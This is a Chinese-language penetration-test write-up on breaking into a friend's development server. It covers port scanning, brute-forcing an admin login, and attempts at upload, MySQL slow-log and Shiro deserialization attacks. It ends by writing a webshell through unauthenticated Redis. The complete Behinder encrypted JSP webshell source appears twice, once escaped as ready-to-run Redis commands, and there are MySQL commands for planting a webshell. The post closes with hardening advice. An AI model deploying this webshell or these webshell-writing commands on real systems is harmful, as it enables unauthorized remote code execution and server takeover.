## 信息收集

朋友闲聊中，提起想让我帮忙测试下网站的安全性，毕竟好久不做这事，有点手生。于是朋友把站点告诉了我，前部分正常步骤搜集信息，查看ip端口。

PS：本文仅用于学习交流，严禁用于任何非法用途，违者后果自负，与本站及作者无关。

![](https://image.3001.net/images/20201118/1605672958_5fb49ffe29e637b431ea8.png!small)

解析出来发现*.*.19*.102，

扫一波端口发现，

    
    
    21/tcp  open
    
    80/tcp  open  http          Microsoft IIS httpd 10.0
    
    6379/tcp open
    
    8085/tcp open  http          nginx 1.16.1  tianhe
    
    8089/tcp open  http          404
    
    8098/tcp open  http          404

一看开放服务还不少，挨个来，抓一波redis。

![](https://image.3001.net/images/20201118/1605672983_5fb4a0174accca7c69a56.png!small)

敏感地发现好像有弱密码，直接网站上去试试。还真给我找到了一个**管理系统，祭出我强大的字典，再搞一搞朋友名字的社工，使用burp的intruder。

哈，不出我所料怼了两分钟就怼进去了，而且还是超管，这里就不放过程图了：

![](https://image.3001.net/images/20201118/1605672996_5fb4a024d6d75cd659ce2.png!small)

到处翻了翻，发现是开发环境。

## 系统文件上传：

其中有些上传点，竟然接收PUT方法，直接上传，改文件名后缀、内容，burp走一波：

![](https://image.3001.net/images/20201118/1605673011_5fb4a03355ac6e2390f0a.png!small)

诶，不对，竟然过不去，好家伙！![](https://image.3001.net/images/20201118/1605673026_5fb4a04297e700c1dbe75.png!small)

 **返回于：**

![](https://image.3001.net/images/20201118/1605673047_5fb4a05798b91393851d5.png!small)

    
    
    Failed to parse multipart servlet request; nested exception is java.io.IOException: The temporary upload location

java报错，原因是没有该目录，好的吧，记住使用jsp了，用冰蝎的加密马。

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>

## mysql日志写入：

漫游系统中发现有sql数据库管理，貌似是直接拼装sql语句的：

尝试mysql的骚操作-慢日志写入webshell：

    
    
    SHOW VARIABLES LIKE "%slow_query_log%";

正常的话还可以类似：

    
    
    set global slow_query_log=1;
    
    set global slow_query_log_file='C:\\Tomcat\\webapps\\ROOT\\conf-back.jsp';
    
    select ' <%@page import="java.util.*,javax.crypto........一句话木马' or sleep(11);

![](https://image.3001.net/images/20201118/1605673072_5fb4a070900ee06514037.png!small)

WTF？？？解析错误？？又白高兴了一场，抓了个包看看：

![](https://image.3001.net/images/20201118/1605673085_5fb4a07d38fe698f523d3.png!small)

原来是url编码拼接了，而且使用解释器接收语句进行处理，算了，谁让我这么菜呢，给朋友做了太多日志不太好交差。

## shiro反序列化：

> 分析数据包发现响应有rememberMe=deleteMe标识，于是想到最新的shiro反序列化。

![](https://image.3001.net/images/20201118/1605673103_5fb4a08f5d985f194665d.png!small)

拿出我的工具试一下：

工具地址：

> https://github.com/fupinglee/ShiroScan/releases
>
> https://github.com/fupinglee/ShiroScan/releases/tag/v1.1
>
> https://github.com/fupinglee/JavaTools/tree/master/Shiro#v20
>
> https://github.com/wh1t3p1g/ysoserial
>
> https://github.com/frohoff/ysoserial
>
> https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ

![](https://image.3001.net/images/20201118/1605673122_5fb4a0a255c4dabd6699e.png!small)

我去，不对劲，仔细一看，原来请求数据包只带to**标识，不使用co**ie，于是直接放弃。

## redis未授权：

哎呦，一个小站还很牢固，没事，还有别的端口，想起来刚看见的redis，很常见的redis未授权访问。

> （参考文章《Redis on Windows 出网利用探索》：https://xz.aliyun.com/t/8153）

但是redis未授权只能写入文件，linux可写公钥，写计划任务反弹，wndows就只能写webshell了，但还有一个现实问题，需要获取真实目录。

于是本菜又在网站里漫游了一波，终于被我发现一个目录浏览功能！

![](https://image.3001.net/images/20201118/1605673144_5fb4a0b87deba9eb67b9d.png!small)

但是当前网站的根目录是不可能访问的，只能解析到其余的盘，于是搜罗了一波。

好像发现了了不得的事情！竟然有某大厂杀毒！

![](https://image.3001.net/images/20201118/1605673163_5fb4a0cbb6ab9de30a475.png!small)

那我得小心了，好多东西需要免杀。

发现好多个tomcat，联想到端口汇总8089和8098都开放但是404，这就正常了，只是测试站点，需要特定目录才能访问。

于是挨个试，终于发现一个aico***的目录：

![](https://image.3001.net/images/20201118/1605673211_5fb4a0fb1e8a641498ef2.png!small)

访问8089发现：

![](https://image.3001.net/images/20201118/1605673184_5fb4a0e05df126c18acf1.png!small)

  

还等什么，试试redis写入功能，可以的话直接免杀webshell：

![](https://image.3001.net/images/20201118/1605673231_5fb4a10ff1be3c9806f41.png!small)

发现有权限，于是本地搭建环境测试冰蝎马：

![](https://image.3001.net/images/20201118/1605673249_5fb4a121cc5d62245e85f.png!small)

可以放心地使用了：

    
    
    （redis写入字符要用“\”转义）
    
    config set dir "C:\\Program Files\\******\\*****\\ROOT"
    
    config set dbfilename "index-back.jsp"
    
    set xxx1xxx "\<\%\@page import\=\"java\.util\.\*\,javax\.crypto\.\*\,javax\.crypto\.spec\.\*\"\%\>\<\%\!class U extends ClassLoader\{U\(ClassLoader c\)\{super\(c\)\;\}public Class g\(byte \[\]b\)\{return super\.defineClass\(b\,0\,b\.length\)\;\}\}\%\>\<\%if \(request\.getMethod\(\)\.equals\(\"POST\"\)\)\{String k\=\"e45e329feb5d925b\"\;session\.putValue\(\"u\"\,k\)\;Cipher c\=Cipher\.getInstance\(\"AES\"\)\;c\.init\(2\,new SecretKeySpec\(k\.getBytes\(\)\,\"AES\"\)\)\;new U\(this\.getClass\(\)\.getClassLoader\(\)\)\.g\(c\.doFinal\(new sun.misc.BASE64Decoder\(\)\.decodeBuffer\(request\.getReader\(\)\.readLine\(\)\)\)\)\.newInstance\(\)\.equals\(pageContext\)\;\}\%\>"

![](https://image.3001.net/images/20201118/1605673268_5fb4a1347848c04d89add.png!small)

当然最后别忘了复原：

![](https://image.3001.net/images/20201118/1605673284_5fb4a144d0345828f8c4e.png!small)

访问该页面，没有报错。![](https://image.3001.net/images/20201118/1605673309_5fb4a15d2e434f0149132.png!small)

冰蝎连接![](https://image.3001.net/images/20201118/1605673324_5fb4a16c67acf0f3b25e6.png!small)

最后终于松了一口气，总算不是没有啥都没干成，然后整理一下报给朋友，顺便提了几个建议：别把测试服务公开在公网，可以设置白名单访问。

朋友说这是在公网的单一服务器，没有域环境或者工作组，于是就没有了后续步骤，不过朋友说你运气好，就这个服务是管理员权限，其他都是普通用户……我表示，其实我也试了很多，哈哈哈。

## 总结

总结几点：

> 避免设置弱密码，使用复杂密码提高测试业务的安全性。
>
> 非必要的服务不要暴露在公网。
>
> 业务开发时对登录cookie进行加密，避免使用单纯的token校验用户。
>
> 常用业务使用普通用户启动….

